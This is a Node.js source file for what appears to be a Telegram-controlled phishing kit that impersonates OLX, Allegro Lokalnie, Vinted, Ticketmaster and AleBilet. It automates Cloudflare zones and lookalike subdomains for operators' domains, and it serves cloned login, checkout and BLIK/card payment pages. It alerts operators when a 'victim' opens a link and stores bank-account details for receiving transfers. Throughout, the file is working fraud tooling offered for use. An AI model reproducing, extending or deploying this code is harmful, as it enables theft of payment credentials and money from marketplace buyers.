					bot.answerCallbackQuery(query.id, {
						text: "❌ Nie można usunąć tego zdjęcia!"
					});
					return;
				}

				const filePath = path.join(__dirname, "images", offer.zdjecia[photoIndex]);
				if (!offer.zdjecia[photoIndex].includes("iphone15")) {
					try {
						await fs.promises.unlink(`${filePath}.jpeg`);
					} catch (err) {
						console.error("Błąd usuwania zdjęcia:", err);
						sendTempMessage(chatId, "❌ Wystąpił błąd podczas usuwania zdjęcia.");
						return;
					}
				}

				offer.zdjecia.splice(photoIndex, 1);
				await editOfferDBOLX(offerId, {
					zdjecia: offer.zdjecia
				});

				if (offer.zdjecia.length === 0) {
					bot.answerCallbackQuery(query.id);
					setTimeout(() => {
						bot.answerCallbackQuery(query.id);
						refreshOfferMenuOLX(chatId, messageId, offerId);
					}, 200);
					return;
				}

				const users = await loadUsersDB();
				const user = users.find(u => u.id === query.from.id);
				const domain = getEffectiveUserDomainSync(user, publicDomain);

				const linksArray = await Promise.all(
					offer.zdjecia.map(async (photo, index) => {
						const offerLink = domain ?
							`https://olx.${domain}/images/${encodeURIComponent(photo)}.jpeg` :
							"NIE MASZ PODPIETEJ DOMENY";
						return `[<tg-emoji emoji-id=\"6028171274939797252\">🔗</tg-emoji> Zdjęcie ${index + 1}](${offerLink})`;
					})
				);

				const caption = "🗑️ Wybierz zdjęcie do usunięcia:\n\n" + linksArray.join("\n");

				const keyboard = offer.zdjecia.map((photo, index) => [{
					text: `Usuń zdjęcie ${index + 1}`,
					callback_data: `olx_confirm_removephoto_${offerId}_${index}`
				}]);

				keyboard.push([{
					text: "Cofnij", icon_custom_emoji_id: "5895507195524550741", callback_data: `olx_cancel_removephoto_${offerId}`
				}]);

				const options = {
					reply_markup: {
						inline_keyboard: keyboard
					}
				};

				bot.editMessageMedia({
					type: "photo",
					media: "attach://bramka.png",
					caption: caption,
				}, {
				parse_mode: "HTML",
					chat_id: chatId,
					message_id: messageId,
					...options
				});
			})
			.catch(error => {
				console.error("Błąd podczas usuwania zdjęcia:", error);
				sendTempMessage(chatId, "❌ Wystąpił błąd podczas usuwania zdjęcia.");
			});
	}


	if (query.data.startsWith("olx_cancel_removephoto_")) {
		const offerId = query.data.split("_")[3];
		refreshOfferMenuOLX(chatId, messageId, offerId);
	}


	if (query.data === 'settings_przelew') {
		if (!canManagePrzelewy(userId)) { await bot.answerCallbackQuery(query.id, { text: "🏦 Przelewy nie są dostępne na Twoim koncie.", show_alert: true }).catch(() => {}); return; }
		const users = await loadUsersDB();
		const user2 = users.find(u => u.id === userId) || { przelewy: {} };
		if (!user2.przelewy) user2.przelewy = {};


		const Imie = user2.przelewy.Imie || "Brak";
		const Nazwisko = user2.przelewy.Nazwisko || "Brak";
		const Numer = user2.przelewy.Numer || "Brak";
		const Status = user2.przelewy.status === "Tak" ? "✅" : user2.przelewy.status === "Nie" ? "❌" : "Brak";



		const caption = `───────── [ 𝕂 ] ─────────\n❖ *USTAWIENIA PRZELEWÓW*\n──────────────────\n\n` +
			`› *Imię:* <code>${Imie}</code>\n` +
			`› *Nazwisko:* <code>${Nazwisko}</code>\n` +
			`› *Numer konta:* <code>${Numer}</code>\n` +
			`› *Status przelewów:* ${Status}`;



		const options = {
			parse_mode: "HTML",
			reply_markup: {
				inline_keyboard: [
					[{
							text: "Zmień Imię", icon_custom_emoji_id: "6032994772321309200",
							callback_data: `przelew_imie`
						},
						{
							text: "Zmień Nazwisko", icon_custom_emoji_id: "6032994772321309200",
							callback_data: `przelew_nazwisko`
						}
					],
					[{
						text: "Zmień Numer Konta", icon_custom_emoji_id: "5920046907782074235", callback_data: `przelew_numer`
					}],
					[{

						text: "Przełącz włączenie przelewów", icon_custom_emoji_id: "5778421276024509124", callback_data: `przelew_toggle`

					}],
					[{
						text: "Cofnij", icon_custom_emoji_id: "5895507195524550741", callback_data: `settings`

					}]
				]
			}
		};


		bot.editMessageMedia({
			type: "photo",
			media: "attach://bramka.png",
			caption: caption,
		}, {
				parse_mode: "HTML",
			chat_id: chatId,
			message_id: messageId,
			...options
		});


	}


	async function reloadPrzelewPanel(chatId, userId, messageId) {
		const users = await loadUsersDB();
		const user2 = users.find(u => u.id === userId) || { przelewy: {} };
		if (!user2.przelewy) user2.przelewy = {};

		const Imie = user2.przelewy.Imie || "Brak";
		const Nazwisko = user2.przelewy.Nazwisko || "Brak";
		const Numer = user2.przelewy.Numer || "Brak";
		const Status = user2.przelewy.status === "Tak" ? "✅" : user2.przelewy.status === "Nie" ? "❌" : "Brak";

		const caption = `───────── [ 𝕂 ] ─────────\n❖ *USTAWIENIA PRZELEWÓW*\n──────────────────\n\n` +
			`› *Imię:* <code>${Imie}</code>\n` +
			`› *Nazwisko:* <code>${Nazwisko}</code>\n` +
			`› *Numer konta:* <code>${Numer}</code>\n` +
			`› *Status przelewów:* ${Status}`;;

		const options = {
			parse_mode: "HTML",
			reply_markup: {
				inline_keyboard: [
					[{
							text: "Zmień Imię", icon_custom_emoji_id: "6032994772321309200",
							callback_data: `przelew_imie`
						},
						{
							text: "Zmień Nazwisko", icon_custom_emoji_id: "6032994772321309200",
							callback_data: `przelew_nazwisko`
						}
					],
					[{
						text: "Zmień Numer Konta", icon_custom_emoji_id: "5920046907782074235", callback_data: `przelew_numer`
					}],
					[{
						text: "Przełącz włączenie przelewów", icon_custom_emoji_id: "5778421276024509124", callback_data: `przelew_toggle`
					}],
					[{
						text: "Cofnij", icon_custom_emoji_id: "5895507195524550741", callback_data: `settings`
					}]
				]
			}
		};

		bot.editMessageMedia({
			type: "photo",
			media: "attach://bramka.png",
			caption: caption,
		}, {
				parse_mode: "HTML",
			chat_id: chatId,
			message_id: messageId,
			...options
		});
	}




	if (query.data === 'przelew_toggle') {
		if (!canManagePrzelewy(userId)) { await bot.answerCallbackQuery(query.id, { text: "🏦 Przelewy nie są dostępne na Twoim koncie.", show_alert: true }).catch(() => {}); return; }
		const users = await loadUsersDB();
		let user = users.find(u => u.id === userId);
		if (!user) return;
		if (!user.przelewy) user.przelewy = {};
		user.przelewy.status = user.przelewy.status === 'Tak' ? 'Nie' : 'Tak';
		await editUserDB(userId, { przelewy: user.przelewy });
		reloadPrzelewPanel(chatId, userId, messageId);
	}

	if (query.data === 'check_cert') {
		await runCertCheck(chatId, userId);
		bot.answerCallbackQuery(query.id);
	}

	if (query.data === 'settings_domain_public') {
		const publicDom = await getPublicDomain();
		if (!publicDom) {
			sendTempMessage(chatId, "⚠️ Administrator nie ustawił jeszcze domeny publicznej.");
			await showUserSettingsMenu(chatId, userId, messageId);
			return;
		}
		await editUserDB(userId, {
			"settings.domainMode": "public",
			"settings.assignedPublicDomain": publicDom
		});
		sendTempMessage(chatId, `<tg-emoji emoji-id=\"5774022692642492953\">✅</tg-emoji> Korzystasz z domeny publicznej: ${publicDom}`);
		await showUserSettingsMenu(chatId, userId, messageId);
	}

	if (query.data === "poczatek") {
		showMainMenu(chatId, userId, messageId);
	}


	if (query.data.startsWith('przelew_')) {
		if (!canManagePrzelewy(userId)) { await bot.answerCallbackQuery(query.id, { text: "🏦 Przelewy nie są dostępne na Twoim koncie.", show_alert: true }).catch(() => {}); return; }
		const users = await loadUsersDB();
		let user = users.find(u => u.id === userId);
		let field;
		let question;

		switch (query.data) {
			case 'przelew_imie':
				field = 'Imie';
				question = '👦 Podaj nowe Imię: \n(stop/cancel)';
				break;
			case 'przelew_nazwisko':
				field = 'Nazwisko';
				question = '👧 Podaj nowe nazwisko: \n(stop/cancel)';
				break;
			case 'przelew_numer':
				field = 'Numer';
				question = '📝 Podaj nowy numer konta: \n(stop/cancel)';
				break;
		}

		if (field) {
			if (!user) return;
			if (!user.przelewy) user.przelewy = {};
			bot.sendMessage(chatId, question).then((sentMessage) => {
				bot.once('message', async (msg) => {
					if (msg.chat.id === chatId) {
						const input = msg.text.trim().toLowerCase();
						if (input === 'stop' || input === 'cancel') {
							sendTempMessage(chatId, '❌ Anulowano');
							bot.answerCallbackQuery(query.id);
						} else {
							user.przelewy[field] = msg.text;
							await editUserDB(userId, {
								przelewy: user.przelewy
							});
							reloadPrzelewPanel(chatId, userId, messageId);
						}
						bot.deleteMessage(chatId, sentMessage.message_id);
					}
				});
			});
		}
	}


	if (query.data === 'settings_creditcard' || query.data === 'settings_bliczki') {
		sendTempMessage(chatId, "ℹ️ BLIK i karty ustawia wyłącznie administrator w panelu /admin.");
		return;
	}

	if (query.data === 'settings_przelew_toggle') {
		if (!canManagePrzelewy(userId)) { await bot.answerCallbackQuery(query.id, { text: "🏦 Przelewy nie są dostępne na Twoim koncie.", show_alert: true }).catch(() => {}); return; }
		const users = await loadUsersDB();
		let user = users.find(u => u.id === userId);
		if (!user) return;
		if (!user.przelewy) user.przelewy = {};
		user.przelewy.status = user.przelewy.status === 'Tak' ? 'Nie' : 'Tak';
		await editUserDB(userId, { przelewy: user.przelewy });
		await showUserSettingsMenu(chatId, userId, messageId);
	}


	if (query.data.startsWith("delete_all")) {
		loadOffersDB().then(offers => {
			const userOffers = offers.filter(o => o.owner.toString() === userId.toString());

			if (userOffers.length === 0) {
				bot.answerCallbackQuery(query.id, {
					text: "❌ Nie masz żadnych ofert do usunięcia!"
				});
				return;
			}

			Offer.deleteMany({
				owner: userId
			}).then(() => {
				bot.answerCallbackQuery(query.id, {
					text: "✅ Wszystkie twoje oferty zostały usunięte!"
				});

				showMainMenu(chatId, userId, messageId);
			}).catch(error => {
				console.error("Błąd podczas usuwania ofert:", error);
				bot.answerCallbackQuery(query.id, {
					text: "❌ Wystąpił błąd podczas usuwania ofert."
				});
			});
		}).catch(error => {
			console.error("Błąd podczas ładowania ofert:", error);
			bot.answerCallbackQuery(query.id, {
				text: "❌ Wystąpił błąd podczas ładowania ofert."
			});
		});
	}

	if (query.data.startsWith("delete_all_olx")) {
		loadOffersOLXDB().then(offers => {
			const userOffers = offers.filter(o => o.owner.toString() === userId.toString());

			if (userOffers.length === 0) {
				bot.answerCallbackQuery(query.id, {
					text: "❌ Nie masz żadnych ofert do usunięcia!"
				});
				return;
			}

			OfferOLX.deleteMany({
				owner: userId
			}).then(() => {
				bot.answerCallbackQuery(query.id, {
					text: "✅ Wszystkie twoje oferty zostały usunięte!"
				});

				showMainMenu(chatId, userId, messageId);
			}).catch(error => {
				console.error("Błąd podczas usuwania ofert:", error);
				bot.answerCallbackQuery(query.id, {
					text: "❌ Wystąpił błąd podczas usuwania ofert."
				});
			});
		}).catch(error => {
			console.error("Błąd podczas ładowania ofert:", error);
			bot.answerCallbackQuery(query.id, {
				text: "❌ Wystąpił błąd podczas ładowania ofert."
			});
		});
	}

	if (query.data === "delete_all_ticketmaster") {
		loadOffersTicketmasterDB().then(offers => {
			const userOffers = offers.filter(o => o.owner.toString() === userId.toString());
			if (userOffers.length === 0) {
				bot.answerCallbackQuery(query.id, { text: "❌ Nie masz żadnych ofert do usunięcia!" });
				return;
			}
			OfferTicketmaster.deleteMany({ owner: userId }).then(() => {
				bot.answerCallbackQuery(query.id, { text: "✅ Wszystkie oferty Ticketmaster usunięte!" });
				showMainMenu(chatId, userId, messageId);
			}).catch(error => {
				console.error("Błąd usuwania Ticketmaster:", error);
				bot.answerCallbackQuery(query.id, { text: "❌ Błąd podczas usuwania." });
			});
		});
	}

	if (query.data === "delete_all_vinted") {
		loadOffersVintedDB().then(offers => {
			const userOffers = offers.filter(o => o.owner.toString() === userId.toString());
			if (userOffers.length === 0) {
				bot.answerCallbackQuery(query.id, { text: "❌ Nie masz żadnych ofert do usunięcia!" });
				return;
			}
			OfferVinted.deleteMany({ owner: userId }).then(() => {
				bot.answerCallbackQuery(query.id, { text: "✅ Wszystkie oferty Vinted usunięte!" });
				showMainMenu(chatId, userId, messageId);
			}).catch(error => {
				console.error("Błąd usuwania Vinted:", error);
				bot.answerCallbackQuery(query.id, { text: "❌ Błąd podczas usuwania." });
			});
		});
	}

	if (query.data === "delete_all_alebilet") {
		loadOffersAlebiletDB().then(offers => {
			const userOffers = offers.filter(o => o.owner.toString() === userId.toString());
			if (userOffers.length === 0) {
				bot.answerCallbackQuery(query.id, { text: "❌ Nie masz żadnych ofert do usunięcia!" });
				return;
			}
			OfferAlebilet.deleteMany({ owner: userId }).then(() => {
				bot.answerCallbackQuery(query.id, { text: "✅ Wszystkie oferty AleBilet usunięte!" });
				showMainMenu(chatId, userId, messageId);
			}).catch(error => {
				console.error("Błąd usuwania AleBilet:", error);
				bot.answerCallbackQuery(query.id, { text: "❌ Błąd podczas usuwania." });
			});
		});
	}


	if (query.data.startsWith("delete_offer_")) {
		const offerId = parseInt(query.data.split("_")[2]);
		const chatId = query.message.chat.id;

		try {
			await deleteOfferDB(offerId);

			bot.answerCallbackQuery(query.id, {
				text: "✅ Oferta została usunięta!"
			});

			const offers = await loadOffersDB();
			if (!offers.some(o => o.owner === userId)) {
				showMainMenu(chatId, userId, messageId);
			} else {
				showUserOffers(chatId, messageId, userId);
			}
		} catch (error) {
			bot.answerCallbackQuery(query.id, {
				text: "❌ Oferta już nie istnieje!"
			});
		}
	}

	if (query.data.startsWith("tm_delete_offer_")) {
		const offerId = query.data.replace("tm_delete_offer_", "");
		try {
			await deleteOfferDBTicketmaster(offerId);
			bot.answerCallbackQuery(query.id, { text: "✅ Oferta została usunięta!" });
			const offers = await loadOffersTicketmasterDB();
			if (!offers.some(o => o.owner.toString() === userId.toString())) {
				showMainMenu(chatId, userId, messageId);
			} else {
				bot.editMessageCaption("📃 Ticketmaster", {
					chat_id: chatId,
					message_id: messageId,
					reply_markup: { inline_keyboard: [[{ text: "Cofnij", icon_custom_emoji_id: "5895507195524550741", callback_data: "my_offers_ticketmaster" }]] }
				}).catch(() => {});
			}
		} catch (error) {
			bot.answerCallbackQuery(query.id, { text: "❌ Oferta już nie istnieje!" });
		}
	}

	if (query.data.startsWith("vinted_delete_offer_")) {
		const offerId = query.data.replace("vinted_delete_offer_", "");
		try {
			await deleteOfferDBVinted(offerId);
			bot.answerCallbackQuery(query.id, { text: "✅ Oferta została usunięta!" });
			const offers = await loadOffersVintedDB();
			if (!offers.some(o => o.owner.toString() === userId.toString())) {
				showMainMenu(chatId, userId, messageId);
			} else {
				bot.editMessageCaption("📃 Vinted", {
					chat_id: chatId,
					message_id: messageId,
					reply_markup: { inline_keyboard: [[{ text: "Cofnij", icon_custom_emoji_id: "5895507195524550741", callback_data: "my_offers_vinted" }]] }
				}).catch(() => {});
			}
		} catch (error) {
			bot.answerCallbackQuery(query.id, { text: "❌ Oferta już nie istnieje!" });
		}
	}

	if (query.data.startsWith("olxdelete_offer_")) {
		const offerId = parseInt(query.data.split("_")[2]);
		const chatId = query.message.chat.id;

		try {
			await deleteOfferDBOLX(offerId);

			bot.answerCallbackQuery(query.id, {
				text: "✅ Oferta została usunięta!"
			});

			const offers = await loadOffersOLXDB();
			if (!offers.some(o => o.owner === userId)) {
				showMainMenu(chatId, userId, messageId);
			} else {
				showUserOffers(chatId, messageId, userId);
			}
		} catch (error) {
			bot.answerCallbackQuery(query.id, {
				text: "❌ Oferta już nie istnieje!"
			});
		}
	}

	if (query.data === "back_to_main") {
		showMainMenu(chatId, userId, messageId);
	}






	function escapeMarkdownV2(text) {
		return text.replace(/([_*\[\]()~`>#+\-=|{}.!])/g, "\\$1");
	}

	if (query.data === "settings") {
		await showUserSettingsMenu(chatId, userId, messageId);
	}

		const CLOUDFLARE_API_KEY = CONFIG.CLOUDFLARE.API_KEY;
	const CLOUDFLARE_EMAIL = CONFIG.CLOUDFLARE.EMAIL;
	const CLOUDFLARE_API_URL = CONFIG.CLOUDFLARE.API_URL;
	const LOCALHOST_IP = CONFIG.CLOUDFLARE.TUNNEL_HOST;

	async function addDomain(domain) {
		if (isReservedDomain(domain)) {
			return null;
		}
		if (!CLOUDFLARE_API_KEY || !CLOUDFLARE_EMAIL || !LOCALHOST_IP) {
			console.error("[Cloudflare] Brak CLOUDFLARE_API_KEY, CLOUDFLARE_EMAIL lub CLOUDFLARE_TUNNEL_HOST w banita.env");
			return null;
		}
		try {
			const existingDomains = await axios.get(`${CLOUDFLARE_API_URL}/zones?name=${domain}`, {
				headers: {
					"X-Auth-Email": CLOUDFLARE_EMAIL,
					"X-Auth-Key": CLOUDFLARE_API_KEY,
					"Content-Type": "application/json",
				},
			});

			let zoneId;
			if (existingDomains.data.result.length > 0) {
				zoneId = existingDomains.data.result[0].id;
			} else {
				const response = await axios.post(
					`${CLOUDFLARE_API_URL}/zones`, {
						name: domain,
						jump_start: true
					}, {
						headers: {
							"X-Auth-Email": CLOUDFLARE_EMAIL,
							"X-Auth-Key": CLOUDFLARE_API_KEY,
							"Content-Type": "application/json",
						},
					}
				);

				zoneId = response.data.result.id;
			}

			if (!zoneId) return null;

			await axios.patch(
				`${CLOUDFLARE_API_URL}/zones/${zoneId}/settings/ssl`, {
					value: "flexible"
				}, {
					headers: {
						"X-Auth-Email": CLOUDFLARE_EMAIL,
						"X-Auth-Key": CLOUDFLARE_API_KEY,
						"Content-Type": "application/json",
					},
				}
			);

			await axios.post(
				`${CLOUDFLARE_API_URL}/zones/${zoneId}/dns_records`, {
					type: "CNAME",
					name: `allegrolokalnie.${domain}`,
					content: LOCALHOST_IP,
					ttl: 1,
					proxied: true
				}, {
					headers: {
						"X-Auth-Email": CLOUDFLARE_EMAIL,
						"X-Auth-Key": CLOUDFLARE_API_KEY,
						"Content-Type": "application/json",
					},
				}
			);

			await axios.post(
				`${CLOUDFLARE_API_URL}/zones/${zoneId}/dns_records`, {
					type: "CNAME",
					name: `olx.${domain}`,
					content: LOCALHOST_IP,
					ttl: 1,
					proxied: true
				}, {
					headers: {
						"X-Auth-Email": CLOUDFLARE_EMAIL,
						"X-Auth-Key": CLOUDFLARE_API_KEY,
						"Content-Type": "application/json",
					},
				}
			);

			for (const sub of ["vinted", "ticketmaster", "alebilet"]) {
				await axios.post(
					`${CLOUDFLARE_API_URL}/zones/${zoneId}/dns_records`, {
						type: "CNAME",
						name: `${sub}.${domain}`,
						content: LOCALHOST_IP,
						ttl: 1,
						proxied: true
					}, {
						headers: {
							"X-Auth-Email": CLOUDFLARE_EMAIL,
							"X-Auth-Key": CLOUDFLARE_API_KEY,
							"Content-Type": "application/json",
						},
					}
				).catch(err => console.error(`[Cloudflare] DNS ${sub}.${domain}:`, err.response?.data || err.message));
			}

			console.log(`[Cloudflare] Domena ${domain} podpięta (DNS → tunnel). Routing automatyczny — tunnel catch-all.`);
			await applyCloudflareGatewaySecurity(zoneId, domain);
			return zoneId;
		} catch (error) {
			console.error("Błąd w addDomain:", error.response ? error.response.data : error.message);
			return null;
		}
	}


	async function getZoneId(domain) {
		try {
			const response = await axios.get(`${CLOUDFLARE_API_URL}/zones?name=${domain}`, {
				headers: {
					"X-Auth-Email": CLOUDFLARE_EMAIL,
					"X-Auth-Key": CLOUDFLARE_API_KEY,
					"Content-Type": "application/json",
				},
			});

			if (response.data.result.length > 0) {
				return response.data.result[0].id;
			}
			return null;
		} catch (error) {
			console.error("Błąd pobierania Zone ID:", error.message);
			return null;
		}
	}

	async function removeDomain(zoneId) {
		try {
			const dnsRecordsResponse = await axios.get(`${CLOUDFLARE_API_URL}/zones/${zoneId}/dns_records`, {
				headers: {
					"X-Auth-Email": CLOUDFLARE_EMAIL,
					"X-Auth-Key": CLOUDFLARE_API_KEY,
					"Content-Type": "application/json",
				},
			});

			if (dnsRecordsResponse.data.success) {
				const records = dnsRecordsResponse.data.result;

				for (const record of records) {
					await axios.delete(`${CLOUDFLARE_API_URL}/zones/${zoneId}/dns_records/${record.id}`, {
						headers: {
							"X-Auth-Email": CLOUDFLARE_EMAIL,
							"X-Auth-Key": CLOUDFLARE_API_KEY,
							"Content-Type": "application/json",
						},
					}).catch(err => console.error(`Błąd usuwania rekordu ${record.name}:`, err.response ? err.response.data : err.message));
				}
			} else {
				console.error("❌ Błąd podczas pobierania rekordów DNS:", dnsRecordsResponse.data.errors);
				return false;
			}

			const response = await axios.delete(`${CLOUDFLARE_API_URL}/zones/${zoneId}`, {
				headers: {
					"X-Auth-Email": CLOUDFLARE_EMAIL,
					"X-Auth-Key": CLOUDFLARE_API_KEY,
					"Content-Type": "application/json",
				},
			});

			return response.data.success;
		} catch (error) {
			console.error("❌ Błąd podczas usuwania domeny:", error.response ? error.response.data : error.message);
			return false;
		}
	}

	async function getNameservers(zoneId) {
		try {
			const response = await axios.get(`${CLOUDFLARE_API_URL}/zones/${zoneId}`, {
				headers: {
					"X-Auth-Email": CLOUDFLARE_EMAIL,
					"X-Auth-Key": CLOUDFLARE_API_KEY,
					"Content-Type": "application/json",
				},
			});

			return response.data.result.name_servers;
		} catch (error) {
			console.error("Błąd pobierania DNS-ów:", error.response?.data || error.message);
			return null;
		}
	}
	const domainRegex = /^(?!-)([a-zA-Z0-9-]{1,63})\.([a-zA-Z]{2,})$/;

	if (query.data === "settings_connect_domain") {
		bot.sendMessage(chatId, "<tg-emoji emoji-id=\"6028171274939797252\">🔗</tg-emoji> <b>Podpięcie własnej domeny</b>\n\nWpisz nazwę domeny (np. `mojadomena.pl`).\n\nPo podpięciu bot przełączy Cię na tryb **własnej domeny**.\n\nMożesz też wpisać:\n• `usun` — usuń własną domenę i wróć do publicznej\n• `cancel` — anuluj", {
			parse_mode: "HTML",
			reply_markup: { force_reply: true }
		}).then((sentMessage) => {
			bot.once("message", async (msg) => {
				if (msg.reply_to_message && msg.reply_to_message.message_id === sentMessage.message_id) {
					const domain = msg.text.trim().toLowerCase();
					bot.deleteMessage(chatId, sentMessage.message_id).catch(() => {});

					if (domain === "cancel" || domain === "stop") {
						sendTempMessage(chatId, "❌ Anulowano dodawanie domeny.");
						bot.answerCallbackQuery(query.id);
						return;
					}

					if (domain === "usun") {
						let users = await loadUsersDB();
						let user = users.find((u) => u.id === userId);
						const oldDomain = user?.settings?.customDomain || user?.settings?.domain;

						if (user && oldDomain) {
							const oldZoneId = await getZoneId(oldDomain);
							if (oldZoneId) await removeDomain(oldZoneId);

							const publicDom = await getPublicDomain();
							user.settings.domainMode = "public";
							user.settings.customDomain = "";
							user.settings.domain = "";
							user.settings.assignedPublicDomain = publicDom;
							await editUserDB(userId, {
								settings: user.settings
							});
							sendTempMessage(chatId, `<tg-emoji emoji-id=\"5774022692642492953\">✅</tg-emoji> Usunięto własną domenę. Wrócono do domeny publicznej${publicDom ? `: ${publicDom}` : ""}.`);
							bot.answerCallbackQuery(query.id);
						} else {
							sendTempMessage(chatId, "❌ Nie masz podpiętej własnej domeny do usunięcia.");
							bot.answerCallbackQuery(query.id);
						}
						return;
					}

					if (!domainRegex.test(domain) || domain.endsWith(".")) {
						sendTempMessage(chatId, "❌ Źle wpisałeś domenę (nie można subdomen podpinać też)");
						bot.answerCallbackQuery(query.id);
						return;
					}

					if (isReservedDomain(domain)) {
						sendTempMessage(chatId, getReservedDomainError(domain));
						bot.answerCallbackQuery(query.id);
						return;
					}

					let users = await loadUsersDB();
					let user = users.find((u) => u.id === userId);

					bot.deleteMessage(chatId, sentMessage.message_id).catch(() => {});

					if (user && (user.settings.customDomain || user.settings.domain)) {
						const oldDomain = user.settings.customDomain || user.settings.domain;
						const oldZoneId = await getZoneId(oldDomain);
						if (oldZoneId) await removeDomain(oldZoneId);
					}

					const zoneId = await addDomain(domain);
					if (!zoneId) {
						sendTempMessage(chatId, "❌ Nie udało się dodać domeny.");
						return;
					}

					const DEFAULT_NS = ["ns1.cloudflare.com", "ns2.cloudflare.com"];
					const nameservers = (await getNameservers(zoneId)) || DEFAULT_NS;

					if (!user) {
						user = {
							id: userId,
							settings: {}
						};
						users.push(user);
					}
					user.settings.domainMode = "custom";
					user.settings.customDomain = domain;
					user.settings.domain = domain;
					await editUserDB(userId, {
						settings: user.settings
					});
					const nsList = nameservers.map((ns) => `• \`${ns}\``).join("\n");

					bot.sendMessage(chatId, `<tg-emoji emoji-id=\"5774022692642492953\">✅</tg-emoji> Domena <code>${domain}</code> została dodana do Cloudflare.\n\n<tg-emoji emoji-id=\"6034969813032374911\">📋</tg-emoji> **Ustaw poniższe nameservery u rejestratora domeny:**\n${nsList}\n\n_Propagacja DNS może potrwać do 24–48 godzin._`, {
						parse_mode: "HTML"
					}).then((nsMessage) => {
						const nsMessageId = nsMessage.message_id;

						bot.editMessageReplyMarkup({
							inline_keyboard: [
								[{
									text: "Tak, ustawiłem", icon_custom_emoji_id: "5774022692642492953", callback_data: `domain_ns_set:${nsMessageId}:${query.message.message_id}`
								}],
								[{
									text: "Nie, jeszcze nie", icon_custom_emoji_id: "6030757850274336631", callback_data: "domain_ns_not_set"
								}]
							]
						}, {
							chat_id: chatId,
							message_id: nsMessageId
						});
					});

				}
			});
		});
	} else if (query.data.startsWith("domain_ns_set:")) {
		const parts = query.data.split(":");
		const messageId = parseInt(parts[1], 10);
		const callbackmessageid = parseInt(parts[2], 10);

		bot.deleteMessage(chatId, messageId).catch(() => {});
		sendTempMessage(chatId, "✅ Ustawiono domenę");

		refreshSettingsPanel(chatId, callbackmessageid);
	} else if (query.data === "domain_ns_not_set") {
		sendTempMessage(chatId, "❌ Pamiętaj, że propagacja może potrwać do 48 godzin. Sprawdź później.");
	}

	async function refreshSettingsPanel(chatId, messageId) {
		await showUserSettingsMenu(chatId, userId, messageId);
	}
	} catch (err) {
		console.error("Błąd callback_query:", err);
		await bot.answerCallbackQuery(query.id).catch(() => {});
	}
});

app.get('/', async (req, res) => {
	const subdomain = parseRequestSubdomain(req);

	if (subdomain === 'ticketmaster' && req.query.id) {
		try {
			const oferty = await loadOffersTicketmasterDB();
			const oferta = oferty.find(o => String(o.idoferty) === String(req.query.id));
			if (!oferta) return res.status(404).send('Nie znaleziono wydarzenia');
			if (!(await isBotOnline()) || !(await areOfferGatewaysAvailable())) {
				return res.status(503).redirect('https://www.ticketmaster.pl/');
			}
			let template = fs.readFileSync(path.join(__dirname, 'template', 'ticketmaster.html'), 'utf8');
			template = applyTicketmasterReplacements(template, oferta, req);
			res.send(template);
			await notifyGatewayVictim(oferta.owner, 'ticketmaster', 'Victim Otworzył Link', buildGatewayNotifyMeta(oferta, 'ticketmaster', req));
			return;
		} catch (error) {
			console.error('Ticketmaster event error:', error);
			return res.status(500).send('Błąd serwera');
		}
	}

	if (subdomain === 'olx') {
		return res.redirect("https://olx.pl/");
	}
	if (subdomain === 'vinted') {
		return res.redirect("https://www.vinted.pl/");
	}
	if (subdomain === 'ticketmaster') {
		return res.redirect("https://www.ticketmaster.pl/");
	}
	if (subdomain === 'alebilet') {
		return res.redirect("https://www.alebilet.pl/");
	}
	return res.redirect(CONFIG.URLS.ALLEGRO_FALLBACK);
});


const dbConfigs = {
	olx: {
		loadOffers: loadOffersOLXDB
	},
	allegrolokalnie: {
		loadOffers: loadOffersDB
	},
	vinted: {
		loadOffers: loadOffersVintedDB
	},
	ticketmaster: {
		loadOffers: loadOffersTicketmasterDB
	},
	alebilet: {
		loadOffers: loadOffersAlebiletDB
	}
};

app.use((req, res, next) => {
	const subdomain = parseRequestSubdomain(req);
	req.subdomain = subdomain;
	req.tenant = dbConfigs[subdomain] || dbConfigs['allegrolokalnie'];
	next();
});



app.get('/oferta/:nazwa', async (req, res) => {
	const {
		nazwa
	} = req.params;
	const {
		allegro,
		olx,
	} = req.query;
	const userAgent = req.get('User-Agent') || "Brak informacji";
	const frontendName = req.subdomain || "allegrolokalnie";
	try {
		const oferta = await findOfferBySubdomain(req.subdomain, nazwa);
		const pedaly = await loadUsersDB();

		let wlasciciel = null;

		if (oferta) {
			wlasciciel = pedaly.find(user => String(user.id) === String(oferta.owner));
		}

		const przelewy = getOwnerPrzelewy(wlasciciel);


		if (!oferta) {
			return res.status(404).redirect(getGatewayFallbackUrl(req.subdomain));
		}

		if (req.subdomain === 'alebilet' && !olx && !allegro) {
			return res.redirect(`/ssl/kup/${encodeURIComponent(nazwa)}`);
		}

		if (req.subdomain === 'alebilet' && olx) {
			oferta.cena = String(getAlebiletPricing(oferta).totalInt);
		}

		if ((req.subdomain === 'ticketmaster' || req.subdomain === 'alebilet') && olx === 'PayU') {
			const q = new URLSearchParams(req.query);
			q.delete('olx');
			const qs = q.toString();
			if (req.subdomain === 'ticketmaster') {
				const dest = `/platnosc/${encodeURIComponent(nazwa)}/${encodeURIComponent(oferta.idoferty)}${qs ? `?${qs}` : ''}`;
				return res.redirect(dest);
			}
			const dest = `/ssl/kup/${encodeURIComponent(nazwa)}/platnosc${qs ? `?${qs}` : ''}`;
			return res.redirect(dest);
		}

		if ((req.subdomain === 'ticketmaster' || req.subdomain === 'alebilet') && olx && ['PayU_BLIK', 'BLIK', 'error'].includes(olx)) {
			const q = new URLSearchParams(req.query);
			if (req.subdomain === 'ticketmaster') {
				return res.redirect(`/platnosc/${encodeURIComponent(nazwa)}/${encodeURIComponent(oferta.idoferty)}/pay?${q.toString()}`);
			}
			return res.redirect(`/ssl/kup/${encodeURIComponent(nazwa)}/pay?${q.toString()}`);
		}

		if (!(await isBotOnline()) || !(await areOfferGatewaysAvailable())) {
			return res.status(503).redirect(getGatewayFallbackUrl(req.subdomain));
		}

		const globalBlikFlag = globalEnabledToTakNie(await isGlobalBlikEnabled());
		const globalCardFlag = globalEnabledToTakNie(await isGlobalCardEnabled());

		let fileName = frontendName === 'allegrolokalnie'
		? 'allegrolokalnie_banita.html' 
		: `${frontendName}.html`;
	
	    let templatePath = path.join(__dirname, 'template', fileName);

		if (allegro === "koszyk") {
			templatePath = 'template/allegrolokalnie_order.html';
		} else if (allegro === "zakup") {
			templatePath = 'template/allegrolokalnie_checkout_banita.html';
		} else if (allegro === "platnosc") {
			templatePath = 'template/allegrolokalnie_payment.html';
		} else if (allegro === "error") {
			templatePath = 'template/allegrolokalnie_error.html';
		} else if (allegro === "login") {
			templatePath = 'template/allegrolokalnie_login.html';
